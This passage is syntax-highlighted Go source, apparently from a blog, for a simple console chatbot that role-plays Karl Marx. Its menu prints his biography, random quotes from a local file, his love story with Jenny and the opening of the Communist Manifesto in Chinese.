class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bufio&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;math/rand&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadLine</span><span class="hljs-params">(lineNumber <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>file, _ := os.Open(<span class="hljs-string">&quot;1.txt&quot;</span>)<br>fileScanner := bufio.NewScanner(file)<br>lineCount := <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> fileScanner.Scan() &#123;<br><span class="hljs-keyword">if</span> lineCount == lineNumber &#123;<br><span class="hljs-keyword">return</span> fileScanner.Text()<br>&#125;<br>lineCount++<br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadLine2</span><span class="hljs-params">(lineNumber <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>file, _ := os.Open(<span class="hljs-string">&quot;2.txt&quot;</span>)<br>fileScanner := bufio.NewScanner(file)<br>lineCount := <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> fileScanner.Scan() &#123;<br><span class="hljs-keyword">if</span> lineCount == lineNumber &#123;<br><span class="hljs-keyword">return</span> fileScanner.Text()<br>&#125;<br>lineCount++<br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mks</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;hi,boy or girl. Do you have someting questions talk with me?&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;是否切换成中文？Y/N&quot;</span>)<br><span class="hljs-keyword">var</span> str1 <span class="hljs-type">string</span><br>fmt.Scanln(&amp;str1)<br><span class="hljs-keyword">if</span> str1==<span class="hljs-string">&quot;N&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;我们只有中文模式，见谅见谅&quot;</span>)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;年轻人，你好，你有什么问题想和我探讨的嘛&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;你想知道什么：&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;1.我的传奇一生\n2.我的经典语录\n3.我的爱情故事\n4.《共产党宣言》\n5.什么是马克思主义\n6.和恩格斯的关系\n7.处于迷茫时期单纯想和我聊聊&quot;</span>)<br>    <span class="hljs-keyword">var</span> num2 <span class="hljs-type">int8</span><br><span class="hljs-keyword">for</span> &#123;<br>_,err:=fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num2)<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">1</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;马克思出生于1818年5月5日，卒于1883年3月14日。犹太裔德国人，全世界无产阶级的伟大导师、科学社会主义的创始人。伟大的政治家、哲学家、经济学家、革命理论家、社会学家、记者、历史学者、革命社会主义者。\n1830年10月，马克思进入特里尔中学。中学毕业后，进入波恩大学，18岁后转学到柏林大学学习法律，但他大部分的学习焦点却摆在哲学上。\n1830年10月，马克思进入特里尔中学。中学毕业后，进入波恩大学，18岁后转学到柏林大学学习法律，但他大部分的学习焦点却摆在哲学上。\n1841年马克思以论文《德谟克利特的自然哲学和伊壁鸠鲁的自然哲学之区别》申请学位，并因得到委员会一致认可，未进一步答辩而顺利获得耶拿大学哲学博士。\n1835年-1841年，马克思在中学毕业先后在波恩大学和柏林大学法律系学习。中学毕业时著作：《青年在选择职业时的考虑》，大学期间，成为青年黑格尔分子。\n1843年6月19日，马克思与童年时代的女友燕妮结婚。6月，前往克罗纳茨赫度蜜月，期间写成《克罗纳茨赫的笔记》;10月移居巴黎。著作：《黑格尔法哲学批判》导言为《德法年鉴》撰写《论犹太人问题》等文章。这表明马克思恩格斯已经完成从唯心主义到唯物主义、从革命民主主义到科学共产主义的转变。\n1844年8月底，马克思与恩格斯在巴黎会见，合写第一部著作《神圣家族》，从此他们开始了终身的合作。11月至次年5月，他们合写《德意志意识形态》，论述了历史唯物主义的基本原理。\n1845年著作：《关于费尔巴哈的提纲》、《德意志意识形态》。\n1847年7月，作《哲学的贫困》。11月底，马克思和恩格斯出席在伦敦举行的共产主义者同盟第二次代表大会，受委托起草同盟纲领。\n1848年2月中旬，国际共产主义运动的第一个纲领性文件《共产党宣言》问世。\n1850年3月和6月，先后两次与恩格斯一起起草《中央委员会告共产主义者同盟书》。1850年，马克思写作《1848年至1850年的法兰西阶级斗争》。\n1851年底至1852年春，写作《路易·波拿巴的雾月十八日》，总绍了欧洲、特别是法国1848年革命的经验。\n1852年10月末-12月初，作《揭露科伦共产党人案件》\n1858年 著作：《鸦片贸易史》。\n1864年9月28日，马克思应邀出席在伦敦圣马丁堂举行的国际工人协会成立大会，当选为协会临时委员会委员，起草了协会的成立宣言和临时章程。\n1867年9月14日，在汉堡《资本论》第一卷出版。\n1871年5月30日，马克思宣读了题为《法兰西内战》的宣言，指出巴黎公社实质上是工人阶级的政府。\n1875年，他写了《对德国工人党纲领草案的意见》。\n1883年3月14日，马克思积劳成疾，躺在安乐椅上溘然长逝，享年65岁。&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">2</span> &#123;<br>rand.Seed(time.Now().Unix())<br>rand := rand.Intn(<span class="hljs-number">40</span>)<br><span class="hljs-comment">//fmt.Println(rand)</span><br>fmt.Println(ReadLine(rand))<br>fmt.Println(<span class="hljs-string">&quot;&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">3</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;马克思的爱人燕妮是特利尔城里有名的美女，相识时马克思4岁，燕妮8岁。他们是儿时\n的邻居，并在那是建立了深厚的感情。17岁的马克思在上大学之前秘密与燕妮订婚，当时燕\n妮21岁。在苦等马克思7、8年后，他们终于在1843年结婚，并相守一生。\n1843年6月19日，马克思与苦等了他7年之久的生于1814年的贵族小姐燕妮结婚。1844\n年1月，与燕妮一起踏上流放的征途。去到巴黎。1845年秋，被法国政府驱逐出境。去到比\n利时布鲁塞尔。\n1845年12月宣布脱离普鲁士国籍。其后和恩格斯一起完成了《德意志意识形态》。书中\n批判了黑格尔的唯心主义，费尔巴哈唯物主义的不彻底。第一次系统的阐述了他们所创立的\n历史唯物主义，明确提出无产阶级夺取政权的历史任务，为社会主义由空想到科学奠定了初\n步理论基础。后来才诞生了《共产党宣言》。随后不久遭到比利时当局的迫害。和妻子一起\n回到德国。\n卡尔·马克思1818年5月5日出生于摩塞尔河畔特利尔的一个普通市民家庭，出生贵族的\n燕妮·冯·威斯特伦的家离马克思的家只有几分钟的路程。\n1836年晚夏，在波恩大学攻读法律的一年级学生马克思，回特利尔向自己热恋的姑娘求\n婚。燕妮就和18岁的马克思约定了终身。按照当时的习俗来说，这是前所未有的。贵族出\n生、年华似锦的燕妮，被公认为是特利尔最美丽的姑娘和“舞会皇后”，许多英俊景族青年\n为之倾倒，求婚者不乏其人，毫无疑问，可以缔结一门荣华富贵的婚姻。但是她却蔑视封建\n社会和资产阶级社会的一切传统观念，瞒着父母把自己许配给一个市民阶级的子弟，她完全\n不能预计和马克思共同生活的前途如何。马克思认为暂时还不能在身为枢密顾问官的燕妮的\n父亲面前正式向燕妮求婚。因此，起初他只能向自己的父亲吐露秘密。他相信，他父亲会在\n燕妮的双亲面前为一次成功的求亲作好各种准备。\n1836年10月，马克思从离家不远的波恩大学转赴离家很远的柏林大学读书，这意味着他\n们之间要忠诚等待一段漫长的时间。在柏林，由于心灵激荡的感情和“倾心思慕”的爱情以\n及带来的悬念和焦虑，曾一度影响了马克思全心全力地投入学习。他曾向他父亲坦率吐露\n说，由于远离摩塞尔河谷，远离他的“无限美好的燕妮”，他已“陷入了真正不平静之\n中”。困扰他的绝不是什么猜忌心，因为他对燕妮的爱情从未有过丝毫怀疑，只是由于想到\n不得不和她在漫长的岁月里长期分离，使他感到心情沉重。\n于是，18岁的马克思就执笔写诗，用诗抒发自己的感情和心声。马克思的诗大多是歌颂\n燕妮和倾吐自己对她的思慕;但其中也有不少是表白自己的思想志愿和渴望有所作为的心情。\n1841年4月15日，马克思提前获得了哲学博士学位。年轻的哲学博士刚刚口到特利尔，\n就赶忙去他最心爱人的家，把博士论文亲手送到燕妮的父亲的手里。燕妮和马克思在多年分\n离之后，本来打算立即结婚的。但光有一篇博士论文并不能作为维持生计的基础，因而他和\n燕妮不得不打消给婚的念头，继续互相等待。从1842年4月开始，马克思开始为《莱茵报》\n撰稿，1842年10月，《莱茵报》的股东们委任马克思为编辑，1843年3月，马克思被迫退出\n《莱茵报》编辑部。接着又与阿尔诺德·卢格磋商了关于共同从事著作出版的计划。此后他才\n到克罗茨纳赫(燕妮在她父亲于1842年3月去世后就和母亲迁居这个地方)，与燕妮举行了婚\n礼。\n从他们私自约定终身到结合，燕妮等待了漫长的七个年头。在这七年中，她除了曾与未\n婚夫马克思有过少数的几次相聚之外，就只能从远处用自己的思念和书信陪伴他了。他在给\n马克思的一封信中写道：“你的形象在我面前是多么光辉灿烂，多么威武堂皇啊!我从内心里\n多么渴望着你能常在我的身旁。我的心啊，是如何满怀喜悦的欢欣为你跳动，我的心啊，是\n何等焦虑地在你走过的道路上跟随着你。……处处有我在陪伴着你，走在你的前头，也跟在\n你的后面。但愿我能把你要走的道路填平，扫清阻挡你前进的一切障碍。” 同时，她还不得\n不同她的几个贵族亲戚进行十分折磨人的斗争。\n婚礼举行后，马克思和燕妮随即动身作了一次短途的新婚旅行。1843年10月底，马克思\n和燕妮一起来到巴黎，同比他们早两个月来到这里的卢格筹办并出版《德法年鉴》杂志。至\n此，他俩拉开了充满困苦和自我牺牲的生活序幕。\n由于马克思对共产主义事业的卓越贡献和对地主、资产阶级无情揭露和批判，使得一切\n反动势力诅咒他，驱逐他。他不得不携持家小四处转移，其生活困难有时达到难以想象的地\n步。1850年3月底，随马克思一起流亡伦敦的燕妮写信给好朋友约瑟夫·魏德迈时，描绘了她\n当时的生活情况：“因为这里奶妈工钱太高，我尽管前胸后背都经常疼得厉害，但还是自己\n给自己孩子喂奶。这个可怜的孩子从我身上吸去了那么多的悲伤和忧虑，所以他一直体弱多\n病，日日夜夜忍受着剧烈的痛苦。他从出生以来，还没有一夜，能睡着二个小时以上的。最\n近又加上剧烈的抽风，所以孩子终日在死亡线上挣扎。由于这些病痛，他拼命地吸奶，以致\n我的乳房被吸伤裂口了;鲜血常常流进他那抖动的小嘴里。\n“有一天，我正抱着他坐着，突然女房东来了，要我付给她五英镑的欠款，可是我们手\n头没有钱。于是来了两个法警，将我的菲薄的家当——床铺衣物等——甚至连我那可怜孩子\n的摇篮以及比较好的玩具都查封了。他们威胁我说两个钟头以后要把全部东西拿走。我只好\n同冻得发抖的孩子们睡光板了。……”\n马克思和燕妮共生了四女二子，白于上述原因，只有三个女儿长大成人。在这种境况\n下，燕妮还是深深地爱着马克思。她除了母亲和主妇的责任，除了为每天的生活操心之外，\n还担负起了许多其他工作。燕妮是马克思不可缺少的秘书，马克思的几乎所有手稿——其中\n大部分是很难辨认的——在送到印刷厂或出版社去以前，总得由她誉写清楚。眼出版社和编\n辑办交涉，一些繁琐的手续，很难处理的事务，必须写的情，不少由她代办。马克思不是那\n种轻易在口头上流露心情的人，但当燕妮因母亲垂危离开了他几个月时，他便在给她的信中\n写道：“深挚的热情由于它的对象的亲近会表现为日常的习惯，而在别离的魔术般的影响下\n会壮大起来并重新具有它固有的力量。我的爱情就是如此。只要我们一为空间所帕，我就立\n即明白，时间之于我的爱情正如阳光雨露之于植物——使其滋长。我对你的爱情，只要你远\n离我身边，就会显出它的本来面目，象巨人一样的面目。在这爱情上集中了我的所有精力和\n全部感情。……我如能把你那温柔而纯洁的心紧贴在自己的心上，我就会默默无言，不作一\n声。我不能以唇吻你，只得求助于文字，以文字来传达轰吻……”\n马克思与燕妮的黄昏之恋更加强烈。1880年，燕妮可能患了肝癌，她以惊人的克制能\n力，忍受着极大的疼痛。在这胆战心惊的岁月，马克思照料妻子，不离左右为了要让她快活\n些，马克思于1881年7、8月间，陪着她到法国去看了大女儿和几个外孙。1881年秋天，由\n于焦急和失眠，体力消耗过度，马克思也病了。他患的是肺炎，有生命危险，但他仍然忘不\n了燕妮。他们的小女儿在谈到双亲暮年生活的时候说“我永远也忘不了那天早晨的情景。他\n觉得自己好多了，已经走得动，能到母亲房间里去了。他们在一起又都成了年轻人，好似一\n对正在开始共同生活的热恋着的青年男女，而不象一个病魔缠身的老翁和一个弥留的老妇，\n不象是即将永别的人。”\n1881年12月2日，燕妮长眠不醒了。这是马克思从未经受过的最大打击。燕妮逝世那\n天，恩格斯说：“摩尔(马克思的别名)也死了。”在以后的几个月里，他接受医生的劝告，\n到气候温和的地方去休养。可是不论到哪儿都忘不了燕妮，止不住悲痛。他写信给最知己朋\n友说：“顺便提一句，你知道，很少有人比我更反对伤感的了。但是如果不承认我时刻在怀\n念我的妻子——她同我的一生中最美好的一切是分不开的——，那就是我在骗人。”他的这\n些话是多么令人感动啊!\n1883年1月11日，传来了大女儿突然去世的噩耗，马克思的病情加重了。1883年3月14\n日中午，马克思安详地、毫无痛苦地与世长辞了。1883年3月17日，马克思被安葬在海格特\n公墓燕妮的坟墓的旁边。&quot;</span>)<br><br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">4</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;\n      一个幽灵，共产主义的幽灵，在欧洲游荡。为了对这个幽灵进行神圣的围剿，旧欧洲的一切势力，教皇和沙皇、梅特涅和基佐、法国的激进派和德国的警察，都联合起来了。\n　　 有哪一个反对党不被它的当政的敌人骂为共产党呢？又有哪一个反对党不拿共产主义这个罪名去回敬更进步的反对党人和自己的反动敌人呢？\n　　 从这一事实中可以得出两个结论：\n　　 共产主义已经被欧洲的一切势力公认为一种势力；\n　　 现在是共产党人向全世界公开说明自己的观点、自己的目的、自己的意图并且拿党自己的宣言来反驳关于共产主义幽灵的神话的时候了。\n　　 为了这个目的，各国共产党人集会于伦敦，拟定了如下的宣言，用英文、法文、德文、意大利文、弗拉芒文和丹麦文公布于世。\n\n一、资产者和无产者\n\n　　 至今一切社会的历史都是阶级斗争的历史。\n　　 自由民和奴隶、贵族和平民、领主和农奴、行会师傅和帮工，一句话，压迫者和被压迫 者，始终处于相互对立的地位，进行不断的、有时隐蔽有时公开的斗争，而每一次斗争的结局都是整个社会受到革命改造或者斗争的各阶级同归于尽。\n　　 在过去的各个历史时代，我们几乎到处都可以看到社会完全划分为各个不同的等级，看到社会地位分成多种多样的层次。在古罗马，有贵族、骑士、平民、奴隶，在中世纪，有封建主、臣仆、行会师傅、帮工、农奴，而且几乎在每一个阶级内部又有一些特殊的阶层。\n　　 从封建社会的灭亡中产生出来的现代资产阶级社会并没有消灭阶级对立。它只是用新的阶级、新的压迫条件、新的斗争形式代替了旧的。\n　　 但是，我们的时代，资产阶级时代，却有一个特点：它使阶级对立简单化了。整个社会日益分裂为两大敌对的阵营，分裂为两大相互直接对立的阶级：资产阶级和无产阶级。\n　　 从中世纪的农奴中产生了初期城市的城关市民；从这个市民等级中发展出最初的资产阶级分子。\n　　 美洲的发现、绕过非洲的航行，给新兴的资产阶级开辟了新天地。东印度和中国的市场、美洲的殖民化、对殖民地的贸易、交换手段和一般商品的增加，使商业、航海业和工业空前高涨，因而使正在崩溃的封建社会内部的革命因素迅速发展。\n　　 以前那种封建的或行会的工业经营方式已经不能满足随着新市场的出现而增加的需求了。工场手工业代替了这种经营方式。行会师傅被工业的中间等级排挤掉了；各种行业组织之间的分工随着各个作坊内部的分工的出现而消失了。\n　　 但是，市场总是在扩大，需求总是在增加。甚至工场手工业也不再能满足需要了。于是，蒸汽和机器引起了工业生产的革命。现代大工业代替了工场手工业；工业中的百万富翁，一支一支产业大军的首领，现代资产者，代替了工业的中间等级。\n　　 大工业建立了由美洲的发现所准备好的世界市场。世界市场使商业、航海业和陆路交通得到了巨大的发展。这种发展又反过来促进了工业的扩展。同时，随着工业、商业、航海业和铁路的扩展，资产阶级也在同一程度上得到发展，增加自己的资本，把中世纪遗留下来的一切阶级排挤到后面去。\n　　 由此可见，现代资产阶级本身是一个长期发展过程的产物，是生产方式和交换方式的一系列变革的产物。\n　　 资产阶级的这种发展的每一个阶段，都伴随着相应的政治上的进展。它在封建主统治下是被压迫的等级，在公社里是武装的和自治的团体，在一些地方组成独立的城市共和国，在另一些地方组成君主国中的纳税的第三等级；后来，在工场手工业时期，它是等级君主国或专制君主国中同贵族抗衡的势力，而且是大君主国的主要基础；最后，从大工业和世界市场建立的时候起，它在现代的代议制国家里夺得了独占的政治统治。现代的国家政权不过是管理整个资产阶级的共同事务的委员会罢了。\n　　 资产阶级在历史上曾经起过非常革命的作用。\n　　 资产阶级在它已经取得了统治的地方把一切封建的、宗法的和田园般的关系都破坏了。它无情地斩断了把人们束缚于天然尊长的形形色色的封建羁绊，它使人和人之间除了赤裸裸的利害关系，除了冷酷无情的“现金交易”，就再也没有任何别的联系了。它把宗教虔诚、骑士热忱、小市民伤感这些情感的神圣发作，淹没在利己主义打算的冰水之中。它把人的尊严变成了交换价值，用一种没有良心的贸易自由代替了无数特许的和自力挣得的自由。总而言之，它用公开的、无耻的、直接的、露骨的剥削代替了由宗教幻想和政治幻想掩盖着的剥削。\n　　 资产阶级抹去了一切向来受人尊崇和令人敬畏的职业的神圣光环。它把医生、律师、教士、诗人和学者变成了它出钱招雇的雇佣劳动者。\n　　 资产阶级撕下了罩在家庭关系上的温情脉脉的面纱，把这种关系变成了纯粹的金钱关系。 资产阶级揭示了，在中世纪深受反动派称许的那种人力的野蛮使用，是以极端怠惰作为相应补充的。它第一个证明了，人的活动能够取得什么样的成就。它创造了完全不同于埃及金字塔、罗马水道和哥特式教堂的奇迹；它完成了完全不同于民族大迁徙和十字军征讨的远征。\n　　 资产阶级除非对生产工具，从而对生产关系，从而对全部社会关系不断地进行革命，否则就不能生存下去。反之，原封不动地保持旧的生产方式，却是过去的一切工业阶级生存的首要条件。生产的不断变革，一切社会状况不停的动荡，永远的不安定和变动，这就是资产阶级时代不同于过去一切时代的地方。一切固定的僵化的关系以及与之相适应的素被尊崇的观念和见解都被消除了，一切新形成的关系等不到固定下来就陈旧了。一切等级的和固定的东西都烟消云散了，一切神圣的东西都被亵渎了。人们终于不得不用冷静的眼光来看他们的生活地位、他们的相互关系。\n　　 不断扩大产品销路的需要，驱使资产阶级奔走于全球各地。它必须到处落户，到处开发，到处建立联系。\n　　 资产阶级，由于开拓了世界市场，使一切国家的生产和消费都成为世界性的了。使反动派大为惋惜的是，资产阶级挖掉了工业脚下的民族基础。古老的民族工业被消灭了，并且每天都还在被消灭。它们被新的工业排挤掉了，新的工业的建立已经成为一切文明民族的生命攸关的问题；这些工业所加工的，已经不是本地的原料，而是来自极其遥远的地区的原料；它们的产品不仅供本国消费，而且同时供世界各地消费。旧的、靠本国产品来满足的需要，被新的、要靠极其遥远的国家和地带的产品来满足的需要所代替了。过去那种地方的和民族的自给自足和闭关自守状态，被各民族的各方面的互相往来和各方面的互相依赖所代替了。物质的生产是如此，精神的生产也是如此。各民族的精神产品成了公共的财产。民族的片面性和局限性日益成为不可能，于是由许多种民族的和地方的文学形成了一种世界的文学。\n　　 资产阶级，由于一切生产工具的迅速改进，由于交通的极其便利，把一切民族甚至最野蛮的民族都卷到文明中来了。它的商品的低廉价格，是它用来摧毁一切万里长城、征服野蛮人最顽强的仇外心理的重炮。它迫使一切民族——如果它们不想灭亡的话——采用资产阶级的生产方式；它迫使它们在自己那里推行所谓文明，即变成资产者。一句话，它按照自己的面貌为自己创造出一个世界。\n　　 资产阶级使农村屈服于城市的统治。它创立了巨大的城市，使城市人口比农村人口大大增加起来，因而使很大一部分居民脱离了农村生活的愚昧状态。正像它使农村从属于城市一样，它使未开化和半开化的国家从属于文明的国家，使农民的民族从属于资产阶级的民族，使东方从属于西方。\n　　 资产阶级日甚一日地消灭生产资料、财产和人口的分散状态。它使人口密集起来，使生产资料集中起来，使财产聚集在少数人的手里。由此必然产生的结果就是政治的集中。各自独立的、几乎只有同盟关系的、各有不同利益、不同法律、不同政府、不同关税的各个地区，现在已经结合为一个拥有统一的政府、统一的法律、统一的民族阶级利益和统一的关税的统一的民族。\n　　 资产阶级在它的不到一百年的阶级统治中所创造的生产力，比过去一切世代创造的全部生产力还要多，还要大。自然力的征服，机器的采用，化学在工业和农业中的应用，轮船的行驶，铁路的通行，电报的使用，整个整个大陆的开垦，河川的通航，仿佛用法术从地下呼唤出来的大量人口，——过去哪一个世纪料想到在社会劳动里蕴藏有这样的生产力呢？\n　　 由此可见，资产阶级赖以形成的生产资料和交换手段，是在封建社会里造成的。在这些生产资料和交换手段发展的一定阶段上，封建社会的生产和交换在其中进行的关系，封建的农业和工场手工业组织，一句话，封建的所有制关系，就不再适应已经发展的生产力了。这种关系已经在阻碍生产而不是促进生产了。它变成了束缚生产的桎梏。它必须被炸毁，它已经被炸毁了。\n　　 起而代之的是自由竞争以及与自由竞争相适应的社会制度和政治制度、资产阶级的经济统治和政治统治。\n　　 现在，我们眼前又进行着类似的运动。资产阶级的生产关系和交换关系，资产阶级的所有制关系，这个曾经仿佛用法术创造了如此庞大的生产资料和交换手段的现代资产阶级社会，现在像一个魔法师一样不能再支配自己用法术呼唤出来的魔鬼了。几十年来的工业和商业的历史，只不过是现代生产力反抗现代生产关系、反抗作为资产阶级及其统治的存在条件的所有制关系的历史。只要指出在周期性的重复中越来越危及整个资产阶级社会生存的商业危机就够了。在商业危机期间，总是不仅有很大一部分制成的产品被毁灭掉，而且有很大一部分已经造成的生产力被毁灭掉。在危机期间，发生一种在过去一切时代看来都好像是荒唐现象的社会瘟疫，即生产过剩的瘟疫。社会突然发现自己回到了一时的野蛮状态；仿佛是一次饥荒、一场普遍的毁灭性战争，使社会失去了全部生活资料；仿佛是工业和商业全被毁灭了，——这是什么缘故呢？因为社会上文明过度，生活资料太多，工业和商业太发达。社会所拥有的生产力已经不能再促进资产阶级文明和资产阶级所有制关系的发展；相反，生产力已经强大到这种关系所不能适应的地步，它已经受到这种关系的阻碍；而它一着手克服这种障碍，就使整个资产阶级社会陷入混乱，就使资产阶级所有制的存在受到威胁。资产阶级的关系已经太狭窄了，再容纳不了它本身所造成的财富了。——资产阶级用什么办法来克服这种危机呢？一方面不得不消灭大量生产力，另一方面夺取新的市场，更加彻底地利用旧的市场。这究竟是怎样的一种办法呢？这不过是资产阶级准备更全面更猛烈的危机的办法，不过是使防止危机的手段越来越少的办法。\n　　 资产阶级用来推翻封建制度的武器，现在却对准资产阶级自己了。\n　　 但是，资产阶级不仅锻造了置自身于死地的武器；它还产生了将要运用这种武器的人——现代的工人，即无产者。\n　　 随着资产阶级即资本的发展，无产阶级即现代工人阶级也在同一程度上得到发展；现代的工人只有当他们找到工作的时候才能生存，而且只有当他们的劳动增殖资本的时候才能找到工作。这些不得不把自己零星出卖的工人，像其他任何货物一样，也是一种商品，所以他们同样地受到竞争的一切变化、市场的一切波动的影响。\n　　 由于推广机器和分工，无产者的劳动已经失去了任何独立的性质，因而对工人也失去了任何吸引力。工人变成了机器的单纯的附属品，要求他做的只是极其简单、极其单调和极容易学会的操作。因此，花在工人身上的费用，几乎只限于维持工人生活和延续工人后代所必需的生活资料。但是，商品的价格，从而劳动的价格，是同它的生产费用相等的。因此，劳动越使人感到厌恶，工资也就越少。不仅如此，机器越推广，分工越细致，劳动量出就越增加，这或者是由于工作时间的延长，或者是由于在一定时间内所要求的劳动的增加，机器运转的加速，等等。\n　　 现代工业已经把家长式的师傅的小作坊变成了工业资本家的大工厂。挤在工厂里的工人群众就像士兵一样被组织起来。他们是产业军的普通士兵，受着各级军士和军官的层层监视。他们不仅仅是资产阶级的、资产阶级国家的奴隶，他们每日每时都受机器、受监工、首先是受各个经营工厂的资产者本人的奴役。这种专制制度越是公开地把营利宣布为自己的最终目的，它就越是可鄙、可恨和可恶。\n　　 手的操作所要求的技巧和气力越少，换句话说，现代工业越发达，男工也就越受到女工和童工的排挤。对工人阶级来说，性别和年龄的差别再没有什么社会意义了。他们都只是劳动工具，不过因为年龄和性别的不同而需要不同的费用罢了。\n　　 当厂主对工人的剥削告一段落，工人领到了用现钱支付的工资的时候，马上就有资产阶级中的另一部分人——房东、小店主、当铺老板等等向他们扑来。\n　　 以前的中间等级的下层，即小工业家、小商人和小食利者，手工业者和农民——所有这些阶级都降落到无产阶级的队伍里来了，有的是因为他们的小资本不足以经营大工业，经不起较大的资本家的竞争；有的是因为他们的手艺已经被新的生产方法弄得不值钱了。无产阶级就是这样从居民的所有阶级中得到补充的。\n　　 无产阶级经历了各个不同的发展阶段。它反对资产阶级的斗争是和它的存在同时开始的。\n　　 最初是单个的工人，然后是某一工厂的工人，然后是某一地方的某一劳动部门的工人，同直接剥削他们的单个资产者作斗争。他们不仅仅攻击资产阶级的生产关系，而且攻击生产工具本身；他们毁坏那些来竞争的外国商品，捣毁机器，烧毁工厂，力图恢复已经失去的中世纪工人的地位。\n　　 在这个阶段上，工人是分散在全国各地并为竞争所分裂的群众。工人的大规模集结，还不是他们自己联合的结果，而是资产阶级联合的结果，当时资产阶级为了达到自己的政治目的必须而且暂时还能够把整个无产阶级发动起来。因此，在这个阶段上，无产者不是同自己的敌人作斗争，而是同自己的敌人的敌人作斗争，即同专制君主制的残余、地主、非工业资产者和小资产者作斗争。因此，整个历史运动都集中在资产阶级手里；在这种条件下取得的每一个胜利都是资产阶级的胜利。\n　　 但是，随着工业的发展，无产阶级不仅人数增加了，而且它结合成更大的集体，它的力量日益增长，它越来越感觉到自己的力量。机器使劳动的差别越来越小，使工资几乎到处都降到同样低的水平，因而无产阶级内部的利益、生活状况也越来越趋于一致。资产者彼此间日益加剧的竞争以及由此引起的商业危机，使工人的工资越来越不稳定；机器的日益迅速的和继续不断的改良，使工人的整个生活地位越来越没有保障；单个工人和单个资产者之间的冲突越来越具有两个阶级的冲突的性质。工人开始成立反对资产者的同盟；他们联合起来保卫自己的工资。他们甚至建立了经常性的团体，以便为可能发生的反抗准备食品。有些地方，斗争爆发为起义。\n　　 工人有时也得到胜利，但这种胜利只是暂时的。他们斗争的真正成果并不是直接取得的成功，而是工人的越来越扩大的联合。这种联合由于大工业所造成的日益发达的交通工具而得到发展，这种交通工具把各地的工人彼此联系起来。只要有了这种联系，就能把许多性质相同的地方性的斗争汇合成全国性的斗争，汇合成阶级斗争。而一切阶级斗争都是政治斗争。中世纪的市民靠乡间小道需要几百年才能达到的联合，现代的无产者利用铁路只要几年就可以达到了。\n　　 无产者组织成为阶级，从而组织成为政党这件事，不断地由于工人的自相竞争而受到破坏。但是，这种组织总是重新产生，并且一次比一次更强大，更坚固，更有力。它利用资产阶级内部的分裂，迫使他们用法律形式承认工人的个别利益。英国的十小时工作日法案就是一个例子。\n　　 旧社会内部的所有冲突在许多方面都促进了无产阶级的发展。资产阶级处于不断的斗争中：最初反对贵族；后来反对同工业进步有利害冲突的那部分资产阶级；经常反对一切外国的资产阶级。在这一切斗争中，资产阶级都不得不向无产阶级呼吁，要求无产阶级援助，这样就把无产阶级卷进了政治运动。于是，资产阶级自己就把自己的教育因素即反对自身的武器给予了无产阶级。\n　　 其次，我们已经看到，工业的进步把统治阶级的整批成员抛到无产阶级队伍里去，或者至少也使他们的生活条件受到威胁。他们也给无产阶级带来了大量的教育因素。\n　　 最后，在阶级斗争接近决战的时期，统治阶级内部的、整个旧社会内部的瓦解过程，就达到非常强烈、非常尖锐的程度，甚至使得统治阶级中的一小部分人脱离统治阶级而归附于革命的阶级，即掌握着未来的阶级。所以，正像过去贵族中有一部分人转到资产阶级方面一样，现在资产阶级中也有一部分人，特别是已经提高到从理论上认识整个历史运动这一水平的一部分资产阶级思想家，转到无产阶级方面来了。\n　　 在当前同资产阶级对立的一切阶级中，只有无产阶级是真正革命的阶级。其余的阶级都随着大工业的发展而日趋没落和灭亡，无产阶级却是大工业本身的产物。\n　　 中间等级，即小工业家、小商人、手工业者、农民，他们同资产阶级作斗争，都是为了维护他们这种中间等级的生存，以免于灭亡。所以，他们不是革命的，而是保守的。不仅如此，他们甚至是反动的，因为他们力图使历史的车轮倒转。如果说他们是革命的，那是鉴于他们行将转入无产阶级的队伍，这样，他们就不是维护他们目前的利益，而是维护他们将来的利益，他们就离开自己原来的立场，而站到无产阶级的立场上来。\n　　 流氓无产阶级是旧社会最下层中消极的腐化的部分，他们在一些地方也被无产阶级革命卷到运动里来，但是，由于他们的整个生活状况，他们更甘心于被人收买，去干反动的勾当。\n　　 